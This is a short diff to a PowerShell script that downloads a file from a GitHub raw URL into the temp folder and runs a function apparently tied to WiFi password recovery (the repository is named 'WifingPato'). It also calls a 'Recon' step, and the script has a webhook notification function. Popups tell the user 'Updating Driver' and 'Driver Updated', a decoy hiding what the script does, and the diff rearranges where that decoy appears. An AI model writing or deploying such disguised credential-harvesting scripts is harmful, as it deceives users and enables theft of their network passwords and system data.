@@ -84,10 +84,7 @@ function Send-EmailNotification {
         Write-Host "Error sending webhook notification: $_"
     }
 }
-function RunWBPV {
-        $done = New-Object -ComObject Wscript.Shell;$done.Popup("Updating Driver",1)
-        Start-Sleep -Seconds 1
-    
+function RunWBPV {    
         # Run WBPV 
         $url = "https://raw.githubusercontent.com/srve650/WifingPato/refs/heads/main/example.txt"  # Define the URL of the file to be downloaded
         $tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Define the path to save the file in the %temp% folder
@@ -533,7 +530,9 @@ for ($step = 1; $step -le $totalSteps; $step++) {
     # Perform your operation here
     switch ($step) {
 
-        1 { RunWBPV; $done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1) }
+        1 { 
+            $done = New-Object -ComObject Wscript.Shell;$done.Popup("Updating Driver",1)
+            RunWBPV; $done = New-Object -ComObject Wscript.Shell;$done.Popup("Driver Updated",1) }
         2 { Recon; $done = New-Object -ComObject Wscript.Shell;$done.Popup("System Updated",1) }
 
     }
